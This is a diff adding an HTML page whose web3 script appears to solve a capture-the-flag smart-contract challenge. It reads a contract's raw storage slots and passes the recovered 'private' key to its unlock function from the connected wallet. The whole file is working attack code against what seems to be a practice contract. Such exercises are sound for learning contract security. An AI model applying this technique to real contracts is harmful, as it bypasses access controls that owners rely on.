@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const privacyContrAddr = "0xdb235A5eaDf8CC35B81Dd26CD289Aa4313A20701";
+        const privacyContract = new window.web3.eth.Contract(
+          [
+            {
+              inputs: [
+                {
+                  internalType: "bytes32[3]",
+                  name: "_data",
+                  type: "bytes32[3]",
+                },
+              ],
+              stateMutability: "nonpayable",
+              type: "constructor",
+            },
+            {
+              inputs: [],
+              name: "ID",
+              outputs: [
+                {
+                  internalType: "uint256",
+                  name: "",
+                  type: "uint256",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "locked",
+              outputs: [
+                {
+                  internalType: "bool",
+                  name: "",
+                  type: "bool",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [
+                {
+                  internalType: "bytes16",
+                  name: "_key",
+                  type: "bytes16",
+                },
+              ],
+              name: "unlock",
+              outputs: [],
+              stateMutability: "nonpayable",
+              type: "function",
+            },
+          ],
+          privacyContrAddr
+        );
+
+        //view contract storage
+        let res;
+        for (let i = 0; i < 6; i++) {
+          res = await window.web3.eth.getStorageAt(privacyContrAddr, i);
+          console.log(i, res);
+          if (i === 4) {
+            console.log(res.substring(0, 34));
+          }
+        }
+
+        await privacyContract.methods
+          .unlock(res.substring(0, 34))
+          .send({ from: ethAddr });
+      })();
+    </script>
+  </body>
+</html>
